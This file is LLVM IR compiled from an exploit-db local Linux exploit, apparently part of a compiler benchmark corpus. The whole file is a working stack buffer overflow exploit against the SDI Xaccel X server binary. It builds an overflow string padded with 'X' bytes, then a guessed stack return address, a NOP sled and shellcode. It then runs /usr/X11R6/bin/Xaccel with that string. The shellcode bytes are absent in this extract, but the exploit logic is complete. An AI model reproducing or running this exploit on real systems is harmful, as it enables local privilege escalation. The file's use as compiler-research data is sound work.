; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19370.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19370.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [40 x i8] c"\0ASDI Xaccel - Offset: %d | Addr: 0x%x\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"/usr/X11R6/bin/Xaccel\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"Xaccel\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1000, i32* %9, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp sgt i32 %12, 1
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  store i32 %18, i32* %9, align 4
  br label %19

19:                                               ; preds = %14, %2
  %20 = ptrtoint i32* %11 to i64
  %21 = load i32, i32* %9, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  store i64 %23, i64* %10, align 8
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  store i8 58, i8* %24, align 16
  store i32 1, i32* %7, align 4
  br label %25

25:                                               ; preds = %32, %19
  %26 = load i32, i32* %7, align 4
  %27 = icmp slt i32 %26, 53
  br i1 %27, label %28, label %35

28:                                               ; preds = %25
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %30
  store i8 88, i8* %31, align 1
  br label %32

32:                                               ; preds = %28
  %33 = load i32, i32* %7, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %7, align 4
  br label %25

35:                                               ; preds = %25
  %36 = load i64, i64* %10, align 8
  %37 = and i64 %36, 255
  %38 = trunc i64 %37 to i8
  %39 = load i32, i32* %7, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %7, align 4
  %41 = sext i32 %39 to i64
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %41
  store i8 %38, i8* %42, align 1
  %43 = load i64, i64* %10, align 8
  %44 = and i64 %43, 65280
  %45 = ashr i64 %44, 8
  %46 = trunc i64 %45 to i8
  %47 = load i32, i32* %7, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %7, align 4
  %49 = sext i32 %47 to i64
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %49
  store i8 %46, i8* %50, align 1
  %51 = load i64, i64* %10, align 8
  %52 = and i64 %51, 16711680
  %53 = ashr i64 %52, 16
  %54 = trunc i64 %53 to i8
  %55 = load i32, i32* %7, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %7, align 4
  %57 = sext i32 %55 to i64
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %57
  store i8 %54, i8* %58, align 1
  %59 = load i64, i64* %10, align 8
  %60 = and i64 %59, 4278190080
  %61 = ashr i64 %60, 24
  %62 = trunc i64 %61 to i8
  %63 = load i32, i32* %7, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %7, align 4
  %65 = sext i32 %63 to i64
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %65
  store i8 %62, i8* %66, align 1
  br label %67

67:                                               ; preds = %74, %35
  %68 = load i32, i32* %7, align 4
  %69 = icmp slt i32 %68, 500
  br i1 %69, label %70, label %77

70:                                               ; preds = %67
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %72
  store i8 -112, i8* %73, align 1
  br label %74

74:                                               ; preds = %70
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %67

77:                                               ; preds = %67
  store i32 0, i32* %8, align 4
  br label %78

78:                                               ; preds = %93, %77
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = load i8*, i8** @shellcode, align 8
  %82 = call i64 @strlen(i8* %81)
  %83 = icmp ult i64 %80, %82
  br i1 %83, label %84, label %98

84:                                               ; preds = %78
  %85 = load i8*, i8** @shellcode, align 8
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = load i32, i32* %7, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %91
  store i8 %89, i8* %92, align 1
  br label %93

93:                                               ; preds = %84
  %94 = load i32, i32* %8, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %8, align 4
  %96 = load i32, i32* %7, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %7, align 4
  br label %78

98:                                               ; preds = %78
  %99 = load i32, i32* @stderr, align 4
  %100 = load i32, i32* %9, align 4
  %101 = load i64, i64* %10, align 8
  %102 = call i32 @fprintf(i32 %99, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i32 %100, i64 %101)
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %104 = call i64 @strlen(i8* %103)
  %105 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %104
  store i8 0, i8* %105, align 1
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %107 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i8* %106, i8* null)
  %108 = load i32, i32* %3, align 4
  ret i32 %108
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i32, i64) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
